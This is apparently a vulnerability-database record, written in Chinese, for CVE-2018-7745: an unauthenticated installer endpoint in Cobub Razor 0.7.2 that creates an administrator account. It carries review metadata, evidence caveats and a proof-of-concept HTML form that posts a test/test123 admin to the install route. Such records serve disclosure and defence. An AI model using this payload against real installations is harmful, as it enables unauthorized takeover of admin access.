---
source: "Mr-xn/Penetration_Testing_POC"
title: "Cobub Razor 安装入口未授权创建管理员"
product: "Cobub Razor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-7745"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "0.7.2；安装功能仍可达"
prerequisites: "无需登录声明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Cobub%20Razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7.md"
id: "vw-0173576b2ef2d67f422145d0"
entity_id: "ve-0173576b2ef2d67f422145d0"
schema_version: "1"
---

# Cobub Razor 安装入口未授权创建管理员

## 条目说明

- 对象与具体问题：Cobub Razor；安装入口未授权创建管理员
- 版本、配置及部署条件：0.7.2；安装功能仍可达
- 认证与权限前提：无需登录声明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 表格0.72与0.7.2需规范；不是44同接口CSRF，单独漏洞
- 打开页无自动提交，不等于马上创建；账号写入为持久副作用
- 保留issue161，缺安装锁状态/响应/固定版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

#### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.7.2越权增加管理员账户|2018-04-09|ppb（ppb@5ecurity.cn）|[https://github.com/cobub/razor/](https://github.com/cobub/razor/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.72| [CVE-2018-7745](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7745)|  

##### 漏洞概述  

> Cobub Razor 0.7.2越权增加管理员账户漏洞，在不登录的情况下发送特定数据包，可新增管理员账号。保存如下利用代码为html页面，打开页面将增加test/test123的管理员账号，漏洞发现者已经将漏洞信息通过[issues](https://github.com/cobub/razor/issues/161)告知作者。   
 

#### POC实现代码如下：  

> 利用代码如下：
``` html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/index.php?/install/installation/createuserinfo" method="POST">
      <input type="hidden" name="siteurl" value="http://127.0.0.1/" />
      <input type="hidden" name="superuser" value="test" />
      <input type="hidden" name="pwd" value="test123" />
      <input type="hidden" name="verifypassword" value="test123" />
      <input type="hidden" name="email" value="12@qq.com" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```


---

> 来源：Mr-xn/Penetration_Testing_POC
